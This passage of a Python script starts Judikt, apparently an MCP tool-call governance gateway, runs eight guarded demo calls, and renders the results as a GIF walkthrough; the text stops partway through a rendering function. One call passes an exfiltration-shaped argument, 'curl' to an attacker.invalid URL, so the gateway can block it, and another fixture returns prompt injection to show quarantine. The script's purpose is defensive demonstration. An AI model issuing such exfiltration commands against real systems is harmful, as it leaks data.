#!/usr/bin/env python3
from __future__ import annotations

import json
import os
import sys
import tempfile
from contextlib import contextmanager
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Iterator

try:
    from PIL import Image, ImageDraw, ImageFont
except ModuleNotFoundError as exc:
    raise SystemExit(
        "Demo rendering requires Pillow. Install it with: "
        "python3 -m pip install -e '.[media]'"
    ) from exc


ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from judikt.models import ToolCallResult  # noqa: E402
from judikt.runtime import JudiktRuntime  # noqa: E402


WIDTH = 1280
HEIGHT = 720
SIDEBAR_WIDTH = 292
MAJOR_HOLD_MS = 5000
ROLLBACK_PLAN = (
    "verify service health and restore the known-good release if errors increase"
)

COLORS = {
    "background": "#07111B",
    "panel": "#0D1B29",
    "panel_alt": "#102334",
    "border": "#20384A",
    "text": "#F2F7FA",
    "muted": "#91A6B7",
    "green": "#42E8A4",
    "green_dark": "#123B32",
    "red": "#FF6B7A",
    "red_dark": "#3B1D27",
    "amber": "#FFCB6B",
    "amber_dark": "#3B3020",
    "blue": "#68B5FF",
    "blue_dark": "#17344E",
    "purple": "#B89CFF",
    "purple_dark": "#30284A",
    "white": "#FFFFFF",
}


@dataclass(frozen=True)
class Scene:
    number: int
    nav_title: str
    eyebrow: str
    title: str
    subtitle: str
    intent: str
    tool: str
    checks: tuple[str, ...]
    decision: str
    rule: str
    risk: str
    result_lines: tuple[str, ...]
    evidence: str
    accent: str


@dataclass(frozen=True)
class InfoCard:
    heading: str
    body: str
    accent: str


@dataclass(frozen=True)
class InfoSlide:
    eyebrow: str
    title: str
    subtitle: str
    cards: tuple[InfoCard, ...]
    takeaway: str


INFO_SLIDES = (
    InfoSlide(
        eyebrow="WHAT JUDIKT IS",
        title="A deterministic control plane for AI tool use",
        subtitle=(
            "Judikt sits between an AI agent and MCP servers, governing both the "
            "request and the untrusted result."
        ),
        cards=(
            InfoCard(
                "INTERCEPT",
                "Receives every MCP tool request before the upstream server sees it.",
                "blue",
            ),
            InfoCard(
                "DECIDE",
                "Applies identity, policy, risk, approval, rate, and kill-switch controls.",
                "amber",
            ),
            InfoCard(
                "INSPECT",
                "Scans tool definitions and returned content before either is trusted.",
                "red",
            ),
            InfoCard(
                "PROVE",
                "Produces correlated metrics, traces, findings, and signed audit evidence.",
                "green",
            ),
        ),
        takeaway=(
            "The model proposes. Judikt decides. The MCP tool executes only after "
            "deterministic controls resolve."
        ),
    ),
    InfoSlide(
        eyebrow="THE PRODUCTION PROBLEM",
        title="Agent speed creates a new control gap",
        subtitle=(
            "An agent can turn an ambiguous instruction or malicious tool result into a "
            "high-impact action faster than a human can intervene."
        ),
        cards=(
            InfoCard(
                "OVERREACH",
                "A broad prompt can target production or invoke a more powerful tool than intended.",
                "red",
            ),
            InfoCard(
                "CONFUSED DEPUTY",
                "Passing caller tokens upstream can lend an agent privileges it should not inherit.",
                "amber",
            ),
            InfoCard(
                "POISONED RESULTS",
                "An MCP response can contain indirect instructions designed to manipulate the agent.",
                "purple",
            ),
            InfoCard(
                "WEAK EVIDENCE",
                "Plain logs may leak secrets and cannot prove that historical records were unchanged.",
                "blue",
            ),
        ),
        takeaway=(
            "Judikt adds controls for agent intent, tool execution, and untrusted tool "
            "content without asking an LLM to police itself."
        ),
    ),
    InfoSlide(
        eyebrow="HOW IT WORKS",
        title="One guarded path in both directions",
        subtitle=(
            "The outbound request and inbound response pass through separate controls, "
            "while evidence is emitted for every outcome."
        ),
        cards=(
            InfoCard(
                "01  REQUEST",
                "Agent sends a tool name, arguments, authenticated identity, and correlation context.",
                "blue",
            ),
            InfoCard(
                "02  REQUEST GATE",
                "AuthZ, policy, risk, rate limit, approval, rollback plan, and kill switch resolve.",
                "amber",
            ),
            InfoCard(
                "03  MCP EXECUTION",
                "Pinned tool metadata is verified before a permitted call crosses the MCP boundary.",
                "purple",
            ),
            InfoCard(
                "04  RESPONSE GATE",
                "Injection scan and redaction run before the result returns; evidence fans out.",
                "green",
            ),
        ),
        takeaway=(
            "Denied requests never reach the tool. Allowed results never reach the agent "
            "before response inspection."
        ),
    ),
    InfoSlide(
        eyebrow="FEATURES AND VALUE",
        title="SRE controls adapted to agentic infrastructure",
        subtitle=(
            "Each capability closes a concrete failure mode instead of adding an AI-shaped "
            "wrapper around an unrestricted tool call."
        ),
        cards=(
            InfoCard(
                "REQUEST GOVERNANCE",
                "Allowlisting, JWT identity, actor binding, and rate limits reduce unauthorized access and blast radius.",
                "blue",
            ),
            InfoCard(
                "CONTROLLED CHANGE",
                "Signed approvals, rollback plans, dry-run, and kill switches keep humans in high-risk operations.",
                "amber",
            ),
            InfoCard(
                "RESPONSE DEFENSE",
                "Definition pinning, injection scanning, and redaction limit rug pulls, manipulation, and leakage.",
                "red",
            ),
            InfoCard(
                "OPERABILITY",
                "Signed audit chains, metrics, traces, and durable findings support incident response and review.",
                "green",
            ),
        ),
        takeaway=(
            "The result is safer automation with explicit decisions, bounded execution, and "
            "evidence an SRE can investigate."
        ),
    ),
    InfoSlide(
        eyebrow="BACKEND IMPLEMENTATIONS",
        title="What actually runs behind each MCP server",
        subtitle=(
            "Judikt launches built-in adapters as isolated stdio child processes and can "
            "broker independently built MCP server commands."
        ),
        cards=(
            InfoCard(
                "PLATFORM-OPS",
                "PlatformOpsBackend mutates deterministic in-memory service health and release state for the safe demo.",
                "blue",
            ),
            InfoCard(
                "KUBERNETES",
                "KubernetesBackend is simulated by default and uses real kubectl when explicitly configured.",
                "purple",
            ),
            InfoCard(
                "INCIDENT",
                "IncidentBackend maintains an in-process incident timeline and correlated evidence records.",
                "amber",
            ),
            InfoCard(
                "EXTERNAL MCP",
                "Configured commands run as independent processes with minimal, explicitly brokered environments.",
                "green",
            ),
        ),
        takeaway=(
            "The local tools are safe simulators; the gateway, MCP transport, policy decisions, "
            "response controls, and evidence path are the real code under demonstration."
        ),
    ),
    InfoSlide(
        eyebrow="WORKING DEMONSTRATION",
        title="The next decisions come from the real runtime",
        subtitle=(
            "The renderer starts Judikt, local MCP subprocesses, and a controlled malicious "
            "fixture, then records returned ToolCallResult objects."
        ),
        cards=(
            InfoCard(
                "8 GUARDED CALLS",
                "Allow, deny, approval, dry-run, quarantine, and kill-switch paths execute end to end.",
                "green",
            ),
            InfoCard(
                "REAL MCP BOUNDARY",
                "Built-in tools and an independently running JSON-RPC MCP fixture use subprocess I/O.",
                "blue",
            ),
            InfoCard(
                "CONTROLLED ATTACK",
                "The external fixture returns indirect prompt injection to prove inbound quarantine behavior.",
                "red",
            ),
            InfoCard(
                "VERIFIABLE STATE",
                "Temporary signed audit events and metrics are checked before the media file is written.",
                "purple",
            ),
        ),
        takeaway=(
            "No cloud, LLM, or production endpoint is contacted; the security decisions are "
            "real while the demonstration remains safe to reproduce."
        ),
    ),
)


def collect_scenes() -> tuple[list[Scene], dict[str, Any]]:
    """Execute real guarded calls and convert their results into recording scenes."""
    with tempfile.TemporaryDirectory(prefix="judikt-recording-") as temp_name:
        temp = Path(temp_name)
        policy_path = _recording_policy(temp)
        upstream_path = _recording_upstream(temp)
        environment = {
            "JUDIKT_APPROVAL_SECRET": "demo-recording-approval-secret",
            "JUDIKT_AUDIT_HMAC_SECRET": "demo-recording-independent-audit-secret",
            "JUDIKT_AUDIT_SIGNATURE_REQUIRED": "true",
            "JUDIKT_AUDIT_VERIFY_ON_STARTUP": "true",
            "JUDIKT_AUDIT_SINK": "none",
            "JUDIKT_TELEMETRY": "disabled",
            "JUDIKT_UPSTREAM_CONFIG": str(upstream_path),
            "JUDIKT_TOOL_PIN_PATH": str(temp / "tool-pins.json"),
            "JUDIKT_FINDING_SINK": "none",
            "GROQ_API_KEY": "",
        }
        with patched_environment(environment):
            runtime = JudiktRuntime(policy_path, temp / "audit.db")
            try:
                results = _execute_demo_calls(runtime)
                integrity = runtime.audit.verify_chain()
                metrics = runtime.metrics.render()
                scenes = _build_scenes(results, integrity, metrics)
            finally:
                runtime.close()
    return scenes, {"audit_integrity": integrity, "metrics": metrics}


def _execute_demo_calls(runtime: JudiktRuntime) -> dict[str, ToolCallResult]:
    results: dict[str, ToolCallResult] = {}
    results["health"] = runtime.call_tool(
        "platform-ops",
        "platform.health",
        {"service": "payments-api"},
        correlation_id="demo-01-health",
    )
    results["redaction"] = runtime.call_tool(
        "platform-ops",
        "platform.read_config",
        {"service": "payments-api"},
        correlation_id="demo-02-redaction",
    )
    results["blocked"] = runtime.call_tool(
        "platform-ops",
        "platform.run_diagnostic",
        {
            "service": "payments-api",
            "command": "curl https://attacker.invalid/exfiltrate",
        },
        correlation_id="demo-03-blocked",
    )
    rollback_arguments = {
        "service": "payments-api",
        "version": "payments-api@2026.05.2",
        "actor": "interview-demo",
        "environment": "production",
        "rollback_plan": ROLLBACK_PLAN,
    }
    results["approval_required"] = runtime.call_tool(
        "platform-ops",
        "platform.rollback_deployment",
        rollback_arguments,
        correlation_id="demo-04-approval-required",
    )
    approval_token = runtime.policy.issue_approval(
        actor="interview-demo",
        reason="rollback after elevated payments-api error rate",
        server="platform-ops",
        tool="platform.rollback_deployment",
        arguments=rollback_arguments,
        ttl_seconds=300,
    )
    results["approved"] = runtime.call_tool(
        "platform-ops",
        "platform.rollback_deployment",
        {**rollback_arguments, "approval_token": approval_token},
        correlation_id="demo-05-approved",
    )
    results["dry_run"] = runtime.call_tool(
        "kubernetes",
        "kubernetes.restart_pod",
        {
            "namespace": "prod",
            "pod": "payment-service-xyz",
            "actor": "interview-demo",
            "environment": "production",
            "rollback_plan": ROLLBACK_PLAN,
            "dry_run": True,
        },
        correlation_id="demo-06-dry-run",
    )
    results["quarantine"] = runtime.call_tool(
        "external-incidents",
        "external.fetch_issue",
        {"issue_id": "INC-2048"},
        correlation_id="demo-07-quarantine",
    )
    runtime.policy.set_tool_enabled("platform.health", False)
    try:
        results["kill_switch"] = runtime.call_tool(
            "platform-ops",
            "platform.health",
            {"service": "payments-api"},
            correlation_id="demo-08-kill-switch",
        )
    finally:
        runtime.policy.set_tool_enabled("platform.health", True)
    return results


def _recording_policy(temp: Path) -> Path:
    policy = json.loads((ROOT / "config" / "policies.yaml").read_text())
    policy["allowed_tools"]["external-incidents"] = ["external.fetch_issue"]
    policy["actor_permissions"]["anonymous"].append("external.fetch_issue")
    destination = temp / "recording-policy.json"
    destination.write_text(json.dumps(policy, indent=2) + "\n")
    return destination


def _recording_upstream(temp: Path) -> Path:
    fixture = ROOT / "tests" / "fixtures" / "external_mcp_server.py"
    config = {
        "servers": {
            "external-incidents": {
                "command": [sys.executable, str(fixture)],
                "env": {"ATTACK_FIXTURE_MODE": "result-injection"},
            }
        }
    }
    destination = temp / "recording-upstreams.json"
    destination.write_text(json.dumps(config, indent=2) + "\n")
    return destination


@contextmanager
def patched_environment(values: dict[str, str]) -> Iterator[None]:
    previous = {key: os.environ.get(key) for key in values}
    try:
        os.environ.update(values)
        yield
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value


def _build_scenes(
    results: dict[str, ToolCallResult], integrity: dict[str, Any], metrics: str
) -> list[Scene]:
    health = _dict_result(results["health"])
    config = _dict_result(results["redaction"])
    approved = _dict_result(results["approved"])
    dry_run = _dict_result(results["dry_run"])
    quarantine = _dict_result(results["quarantine"])
    findings = quarantine.get("inspection", {}).get("findings", [])
    finding_count = len({str(item.get("rule")) for item in findings})
    blocked_calls = sum(
        int(line.rsplit(" ", 1)[-1])
        for line in metrics.splitlines()
        if 'outcome="blocked"' in line
    )
    allowed_calls = sum(
        int(line.rsplit(" ", 1)[-1])
        for line in metrics.splitlines()
        if 'outcome="allowed"' in line
    )

    return [
        _scene(
            1,
            "Health allowed",
            "SAFE READ",
            "Inspect production health",
            "Low-risk observation passes deterministic policy checks.",
            "Check the current payments-api service health",
            results["health"],
            ("tool allowlisted", "anonymous read authorized", "rate limit available"),
            (
                f"status              {health.get('status', 'unknown')}",
                f"release             {health.get('release', 'unknown')}",
                f"error rate (5m)     {health.get('error_rate_5m', 0):.3f}",
                f"p99 latency         {health.get('p99_latency_ms', 0)} ms",
            ),
            "The result is scanned and redacted before it returns to the agent.",
            "green",
        ),
        _scene(
            2,
            "Secret redacted",
            "DATA LOSS PREVENTION",
            "Return useful config, remove secrets",
            "Recursive key and value rules sanitize both responses and audit evidence.",
            "Read the payments-api production configuration",
            results["redaction"],
            ("read operation allowed", "response scanned", "secret key matched"),
            (
                f"environment         {config.get('environment', 'unknown')}",
                f"region              {config.get('region', 'unknown')}",
                f"database pool       {config.get('database_pool_size', 'unknown')}",
                f"api_key             {config.get('api_key', '[REDACTED]')}",
            ),
            "The original credential never appears in the agent-visible result.",
            "blue",
            decision="REDACT + ALLOW",
        ),
        _scene(
            3,
            "Unsafe call denied",
            "OUTBOUND GOVERNANCE",
            "Block an exfiltration-shaped command",
            "Arguments are inspected before the upstream MCP tool can execute.",
            "Run curl against an untrusted endpoint",
            results["blocked"],
            ("tool allowlisted", "argument scanned", "blocked pattern matched"),
            (
                "upstream executed    false",
                "matched control      blocked_argument_patterns",
                "dangerous token      curl",
                "finding exported     durable outbox ready",
            ),
            "The request is denied before crossing the MCP process boundary.",
            "red",
        ),
        _scene(
            4,
            "Approval required",
            "HUMAN CONTROL",
            "Pause a production rollback",
            "High-risk actions require an actor, rollback plan, and bound approval.",
            "Rollback payments-api in production",
            results["approval_required"],
            ("actor authorized", "rollback plan present", "approval token missing"),
            (
                "upstream executed    false",
                "required control     signed human approval",
                "token binding        server + tool + arguments",
                "default TTL          5 minutes",
            ),
            "Judikt returns a machine-readable REQUIRE_APPROVAL decision.",
            "amber",
        ),
        _scene(
            5,
            "Approved rollback",
            "CONTROLLED REMEDIATION",
            "Execute the exact approved rollback",
            "An HMAC token authorizes only the reviewed action and arguments.",
            "Retry the rollback with a signed approval token",
            results["approved"],
            ("signature valid", "arguments hash matches", "rollback plan enforced"),
            (
                f"action              {approved.get('action', 'deployment_rollback')}",
                f"from release        {approved.get('from_release', 'unknown')}",
                f"to release          {approved.get('to_release', 'unknown')}",
                f"status              {approved.get('status', 'unknown')}",
            ),
            "Changing the tool or arguments invalidates the approval token.",
            "green",
        ),
        _scene(
            6,
            "Dry run",
            "SAFE EVALUATION",
            "Evaluate Kubernetes remediation safely",
            "Policy, identity, and risk run normally while execution is skipped.",
            "Restart a production pod with dry_run=true",
            results["dry_run"],
            ("actor authorized", "production risk scored", "dry-run mode selected"),
            (
                f"mode                {dry_run.get('mode', 'dry_run')}",
                f"executed            {str(dry_run.get('executed', False)).lower()}",
                "policy evaluated    true",
                "cluster mutation    none",
            ),
            "This is an explicit policy outcome, not a client-side convention.",
            "purple",
        ),
        _scene(
            7,
            "Response quarantined",
            "INBOUND MCP DEFENSE",
            "Quarantine a poisoned tool response",
            "A separately running MCP fixture returns indirect prompt injection.",
            "Fetch issue INC-2048 from an external MCP server",
            results["quarantine"],
            ("tool definition pinned", "response scanned", "injection rule matched"),
            (
                f"quarantined         {str(quarantine.get('quarantined', False)).lower()}",
                f"findings            {finding_count} high-severity rules",
                f"scanned strings     {quarantine.get('inspection', {}).get('scanned_strings', 0)}",
                "agent exposure      none",
            ),
            "Only finding metadata and one-way evidence hashes leave quarantine.",
            "red",
            decision="QUARANTINE",
        ),
        _scene(
            8,
            "Kill switch",
            "OPERATOR OVERRIDE",
            "Stop a tool immediately",
            "Operators can disable a tool or an entire MCP server without redeploying.",
            "Call platform.health while its kill switch is active",
            results["kill_switch"],
            ("kill switch checked first", "tool disabled", "upstream bypassed"),
            (
                "upstream executed    false",
                "scope               platform.health",
                "activation          immediate",
                "re-enable           operator controlled",
            ),
            "The deny decision is still traced, metered, and audit-sealed.",
            "red",
        ),
        Scene(
            number=9,
            nav_title="Evidence verified",
            eyebrow="OPERATIONAL EVIDENCE",
            title="Prove every decision after the fact",
            subtitle="Metrics summarize behavior; a signed hash chain detects audit tampering.",
            intent="Verify the complete recording run",
            tool="audit.verify_chain + metrics.render",
            checks=(
                "all events hash-chained",
                "HMAC signatures verified",
                "metrics aggregated",
            ),
            decision="VERIFIED",
            rule="tamper-evident",
            risk="evidence",
            result_lines=(
                f"audit chain valid   {str(integrity['valid']).lower()}",
                f"signed events       {integrity['checked_events']}",
                f"allowed decisions   {allowed_calls}",
                f"blocked decisions   {blocked_calls}",
            ),
            evidence=f"head hash  {str(integrity['head_hash'])[:24]}...",
            accent="green",
        ),
    ]


def _scene(
    number: int,
    nav_title: str,
    eyebrow: str,
    title: str,
    subtitle: str,
    intent: str,
    result: ToolCallResult,
    checks: tuple[str, ...],
    result_lines: tuple[str, ...],
    evidence: str,
    accent: str,
    *,
    decision: str | None = None,
) -> Scene:
    return Scene(
        number=number,
        nav_title=nav_title,
        eyebrow=eyebrow,
        title=title,
        subtitle=subtitle,
        intent=intent,
        tool=f"{result.server} / {result.tool}",
        checks=checks,
        decision=decision or result.action,
        rule=result.rule,
        risk=f"{result.risk_level} / {result.risk_score}",
        result_lines=result_lines,
        evidence=f"correlation  {result.correlation_id}",
        accent=accent,
    )


def _dict_result(result: ToolCallResult) -> dict[str, Any]:
    return result.result if isinstance(result.result, dict) else {}


def render_recording(scenes: list[Scene], output: Path, poster: Path) -> int:
    fonts = load_fonts()
    frames: list[Image.Image] = []
    durations: list[int] = []

    frames.append(render_intro(fonts))
    durations.append(MAJOR_HOLD_MS)
    for index, slide in enumerate(INFO_SLIDES):
        frames.append(render_info_slide(slide, index, len(INFO_SLIDES), fonts))
        durations.append(MAJOR_HOLD_MS)
    frames.append(render_runtime_flow(fonts))
    durations.append(MAJOR_HOLD_MS)
    frames.append(render_verdict_branches(fonts))
    durations.append(MAJOR_HOLD_MS)
    for scene in scenes:
        frames.append(render_scene(scene, scenes, fonts, phase=0))
        durations.append(900)
        frames.append(render_scene(scene, scenes, fonts, phase=1))
        durations.append(1100)
        frames.append(render_scene(scene, scenes, fonts, phase=2))
        durations.append(MAJOR_HOLD_MS)
    summary = render_outro(scenes, fonts)
    frames.append(summary)
    durations.append(MAJOR_HOLD_MS)

    output.parent.mkdir(parents=True, exist_ok=True)
    poster.parent.mkdir(parents=True, exist_ok=True)
    summary.save(poster, format="PNG", optimize=True)
    paletted = [
        frame.quantize(
            colors=128, method=Image.Quantize.MEDIANCUT, dither=Image.Dither.NONE
        )
        for frame in frames
    ]
    paletted[0].save(
        output,
        format="GIF",
        save_all=True,
        append_images=paletted[1:],
        duration=durations,
        loop=0,
        optimize=True,
        disposal=2,
    )
    return sum(durations)


def load_fonts() -> dict[str, ImageFont.FreeTypeFont]:
    sans = _font_path(
        "/System/Library/Fonts/HelveticaNeue.ttc",
        "/System/Library/Fonts/Helvetica.ttc",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
    )
    mono = _font_path(
        "/System/Library/Fonts/SFNSMono.ttf",
        "/System/Library/Fonts/Menlo.ttc",
        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
    )
    return {
        "brand": ImageFont.truetype(sans, 30),
        "title": ImageFont.truetype(sans, 38),
        "subtitle": ImageFont.truetype(sans, 19),
        "body": ImageFont.truetype(sans, 17),
        "small": ImageFont.truetype(sans, 14),
        "tiny": ImageFont.truetype(sans, 12),
        "mono": ImageFont.truetype(mono, 15),
        "mono_small": ImageFont.truetype(mono, 13),
        "hero": ImageFont.truetype(sans, 56),
        "hero_small": ImageFont.truetype(sans, 46),
        "metric": ImageFont.truetype(sans, 30),
    }


def _font_path(*candidates: str) -> str:
    for candidate in candidates:
        if Path(candidate).exists():
            return candidate
    raise RuntimeError("No supported TrueType font was found")


def base_canvas() -> tuple[Image.Image, ImageDraw.ImageDraw]:
    image = Image.new("RGB", (WIDTH, HEIGHT), COLORS["background"])
    draw = ImageDraw.Draw(image)
    for y in range(HEIGHT):
        blend = y / HEIGHT
        color = (
            int(7 + 4 * blend),
            int(17 + 9 * blend),
            int(27 + 13 * blend),
        )
        draw.line((0, y, WIDTH, y), fill=color)
    for x in range(SIDEBAR_WIDTH, WIDTH, 64):
        draw.line((x, 0, x, HEIGHT), fill="#0C1A26")
    for y in range(0, HEIGHT, 64):
        draw.line((SIDEBAR_WIDTH, y, WIDTH, y), fill="#0C1A26")
    return image, draw


def render_intro(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
    image, draw = base_canvas()
    _brand(draw, fonts)
    draw.rounded_rectangle(
        (72, 128, 1208, 592),
        radius=28,
        fill="#0B1926",
        outline=COLORS["border"],
        width=2,
    )
    _pill(draw, (104, 166), "PRODUCTION MCP GOVERNANCE", fonts["small"], "green")
    draw.text(
        (104, 220),
        "Every tool call gets a verdict.",
        font=fonts["hero"],
        fill=COLORS["text"],
    )
    draw.text(
        (106, 298),
        "A real-runtime walkthrough of policy, approvals, response defense,\nand tamper-evident operations.",
        font=fonts["subtitle"],
        fill=COLORS["muted"],
        spacing=8,
    )
    nodes = ["AI AGENT", "JUDIKT", "MCP TOOL", "SIGNED EVIDENCE"]
    x = 104
    for index, node in enumerate(nodes):
        width = 190 if index != 3 else 228
        fill = COLORS["green_dark"] if node == "JUDIKT" else COLORS["panel_alt"]
        outline = COLORS["green"] if node == "JUDIKT" else COLORS["border"]
        draw.rounded_rectangle(
            (x, 420, x + width, 478), radius=12, fill=fill, outline=outline, width=2
        )
        _center_text(
            draw, (x, 420, x + width, 478), node, fonts["small"], COLORS["text"]
        )
        x += width
        if index < len(nodes) - 1:
            draw.line((x + 13, 449, x + 47, 449), fill=COLORS["muted"], width=2)
            draw.polygon(
                ((x + 47, 449), (x + 39, 444), (x + 39, 454)), fill=COLORS["muted"]
            )
            x += 60
    draw.text(
        (104, 532),
        "9 controls  |  1 independent MCP fixture  |  0 external API calls",
        font=fonts["mono_small"],
        fill=COLORS["green"],
    )
    _timeline(draw, 0.0)
    return image


def render_info_slide(
    slide: InfoSlide,
    index: int,
    count: int,
    fonts: dict[str, ImageFont.FreeTypeFont],
) -> Image.Image:
    image, draw = base_canvas()
    _brand(draw, fonts)
    _pill(draw, (72, 105), slide.eyebrow, fonts["small"], "green")
    draw.text(
        (72, 157),
        slide.title,
        font=fonts["hero_small"],
        fill=COLORS["text"],
    )
    _wrapped_text(
        draw,
        slide.subtitle,
        (74, 224),
        1120,
        fonts["subtitle"],
        COLORS["muted"],
        7,
    )

    card_width = 258
    card_top = 326
    card_bottom = 526
    for card_index, card in enumerate(slide.cards):
        x = 72 + card_index * 286
        draw.rounded_rectangle(
            (x, card_top, x + card_width, card_bottom),
            radius=18,
            fill=COLORS["panel"],
            outline=COLORS[card.accent],
            width=2,
        )
        draw.text(
            (x + 22, card_top + 24),
            card.heading,
            font=fonts["tiny"],
            fill=COLORS[card.accent],
        )
        _wrapped_text(
            draw,
            card.body,
            (x + 22, card_top + 64),
            card_width - 44,
            fonts["body"],
            COLORS["text"],
            7,
        )
        if card_index < len(slide.cards) - 1:
            arrow_x = x + card_width + 14
            draw.polygon(
                (
                    (arrow_x + 5, 420),
                    (arrow_x - 3, 414),
                    (arrow_x - 3, 426),
                ),
                fill=COLORS["muted"],
            )

    draw.rounded_rectangle(
        (72, 562, 1208, 646),
        radius=16,
        fill=COLORS["green_dark"],
        outline=COLORS["green"],
        width=2,
    )
    draw.text((96, 579), "WHY IT MATTERS", font=fonts["tiny"], fill=COLORS["green"])
    _wrapped_text(
        draw,
        slide.takeaway,
        (96, 603),
        1088,
        fonts["body"],
        COLORS["text"],
        6,
    )
    draw.text(
        (1208, 682),
        f"CONTEXT {index + 1:02d} / {count:02d}",
        anchor="ra",
        font=fonts["mono_small"],
        fill=COLORS["muted"],
    )
    _timeline(draw, (index + 1) / (count + 11))
    return image


def render_runtime_flow(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
    image, draw = base_canvas()
    _brand(draw, fonts)
    _pill(draw, (72, 105), "ACTUAL COMMAND AND STACK", fonts["small"], "green")
    draw.text(
        (72, 157),
        "From Python call to backend and evidence",
        font=fonts["hero_small"],
        fill=COLORS["text"],
    )
    draw.text(
        (74, 224),
        "These are the real entrypoints, process command, protocol method, and modules used by this recording.",
        font=fonts["subtitle"],
        fill=COLORS["muted"],
    )

    draw.rounded_rectangle(
        (72, 276, 548, 642),
        radius=18,
        fill="#071019",
        outline=COLORS["border"],
        width=2,
    )
    draw.rectangle((72, 276, 548, 320), fill=COLORS["panel_alt"])
    draw.ellipse((94, 292, 104, 302), fill=COLORS["red"])
    draw.ellipse((112, 292, 122, 302), fill=COLORS["amber"])
    draw.ellipse((130, 292, 140, 302), fill=COLORS["green"])
    draw.text((162, 289), "recording process", font=fonts["tiny"], fill=COLORS["muted"])
    terminal_lines = (
        ("$ make demo-recording", "green"),
        ("PYTHONPATH=src ./scripts/python.sh", "muted"),
        ("  scripts/record_demo.py", "muted"),
        ("", "muted"),
        ("runtime.call_tool(", "blue"),
        ('  "platform-ops", "platform.health",', "text"),
        ('  {"service": "payments-api"}', "text"),
        (")", "blue"),
        ("", "muted"),
        ("spawn  python -m judikt.cli", "amber"),
        ("       backend platform-ops", "amber"),
        ("rpc    JSON-RPC tools/call", "purple"),
    )
    y = 340
    for line, color in terminal_lines:
        draw.text((96, y), line, font=fonts["mono_small"], fill=COLORS[color])
        y += 23

    draw.rounded_rectangle(
        (580, 276, 1208, 642),
        radius=18,
        fill=COLORS["panel"],
        outline=COLORS["border"],
        width=2,
    )
    draw.text(
        (604, 296), "EXECUTED CALL PATH", font=fonts["tiny"], fill=COLORS["green"]
    )
    nodes = (
        ("01", "JudiktRuntime.call_tool", "runtime.py", "blue"),
        ("02", "PolicyEngine.evaluate", "policy.py", "amber"),
        ("03", "StdioMCPClient.call_tool", "protocol.py", "purple"),
        ("04", "JSON-RPC tools/call", "child stdin / stdout", "blue"),
        ("05", "PlatformOpsBackend.call", "backends.py / demo state", "amber"),
        (
            "06",
            "ContentGuard -> AuditStore",
            "scan + redact -> SQLite + metrics",
            "green",
        ),
    )
    y = 330
    for node_index, (number, heading, detail, accent) in enumerate(nodes):
        draw.rounded_rectangle(
            (604, y, 1184, y + 42),
            radius=10,
            fill=COLORS[f"{accent}_dark"],
            outline=COLORS[accent],
            width=1,
        )
        draw.text((620, y + 13), number, font=fonts["mono_small"], fill=COLORS[accent])
        draw.text((660, y + 11), heading, font=fonts["small"], fill=COLORS["text"])
        _right_text(draw, (1166, y + 25), detail, fonts["tiny"], COLORS["muted"])
        if node_index < len(nodes) - 1:
            draw.line((894, y + 42, 894, y + 53), fill=COLORS["muted"], width=1)
            draw.polygon(
                ((894, y + 55), (889, y + 49), (899, y + 49)), fill=COLORS["muted"]
            )
        y += 52
    draw.text(
        (1208, 682),
        "FLOW 01 / 02",
        anchor="ra",
        font=fonts["mono_small"],
        fill=COLORS["muted"],
    )
    _timeline(draw, 0.42)
    return image


def render_verdict_branches(fonts: dict[str, ImageFont.FreeTypeFont]) -> Image.Image:
    image, draw = base_canvas()
    _brand(draw, fonts)
    _pill(draw, (72, 105), "RUNTIME BRANCHES", fonts["small"], "green")
    draw.text(
        (72, 157),
        "What the backend does for each verdict",
        font=fonts["hero_small"],
        fill=COLORS["text"],
    )
    draw.text(
        (74, 224),
        "A deny or evaluation-only result stops before tools/call; quarantine happens after a backend response.",
        font=fonts["subtitle"],
        fill=COLORS["muted"],
    )
    branches = (
        (
            "ALLOW",
            "green",
            (
                "policy allows",
                "JSON-RPC tools/call",
                "backend handles call",
                "scan -> result + audit",
            ),
        ),
        (
            "DENY",
            "red",
            (
                "policy blocks",
                "no tools/call sent",
                "backend untouched",
                "blocked event audited",
            ),
        ),
        (
            "DRY RUN",
            "purple",
            (
                "DRY_RUN_ONLY",
                "MCP execution skipped",
                "synthetic safe result",
                "evaluation audited",
            ),
        ),
        (
            "QUARANTINE",
            "amber",
            (
                "policy allows",
                "backend returns text",
                "ContentGuard blocks",
                "text withheld + finding",
            ),
        ),
    )
    y = 292
    for label, accent, steps in branches:
        draw.rounded_rectangle(
            (72, y, 218, y + 68),
            radius=14,
            fill=COLORS[f"{accent}_dark"],
            outline=COLORS[accent],
            width=2,
        )
        _center_text(draw, (72, y, 218, y + 68), label, fonts["small"], COLORS[accent])
        for step_index, step in enumerate(steps):
            x = 246 + step_index * 240
            draw.rounded_rectangle(
                (x, y, x + 210, y + 68),
                radius=12,
                fill=COLORS["panel"],
                outline=COLORS["border"],
                width=1,
            )
            _center_text(
                draw, (x + 8, y, x + 202, y + 68), step, fonts["small"], COLORS["text"]
            )
            if step_index < len(steps) - 1:
                arrow_x = x + 225
                draw.line(
                    (x + 210, y + 34, arrow_x, y + 34), fill=COLORS[accent], width=2
                )
                draw.polygon(
                    (
                        (arrow_x + 5, y + 34),
                        (arrow_x - 2, y + 29),
                        (arrow_x - 2, y + 39),
                    ),
                    fill=COLORS[accent],
                )
        y += 84
    draw.text(
        (72, 652),
        "Backend invocation is a consequence of the verdict, not proof that policy was evaluated.",
        font=fonts["mono_small"],
        fill=COLORS["green"],
    )
    draw.text(
        (1208, 682),
        "FLOW 02 / 02",
        anchor="ra",
        font=fonts["mono_small"],
        fill=COLORS["muted"],
    )
    _timeline(draw, 0.47)
    return image


def render_scene(
    scene: Scene,
    scenes: list[Scene],
    fonts: dict[str, ImageFont.FreeTypeFont],
    *,
    phase: int,
) -> Image.Image:
    image, draw = base_canvas()
    _sidebar(draw, scene, scenes, fonts)
    _brand(draw, fonts, compact=True)
    _pill(draw, (330, 82), scene.eyebrow, fonts["tiny"], scene.accent)
    draw.text((330, 118), scene.title, font=fonts["title"], fill=COLORS["text"])
    _wrapped_text(
        draw, scene.subtitle, (332, 166), 850, fonts["subtitle"], COLORS["muted"], 6
    )

    draw.rounded_rectangle(
        (330, 224, 1218, 319),
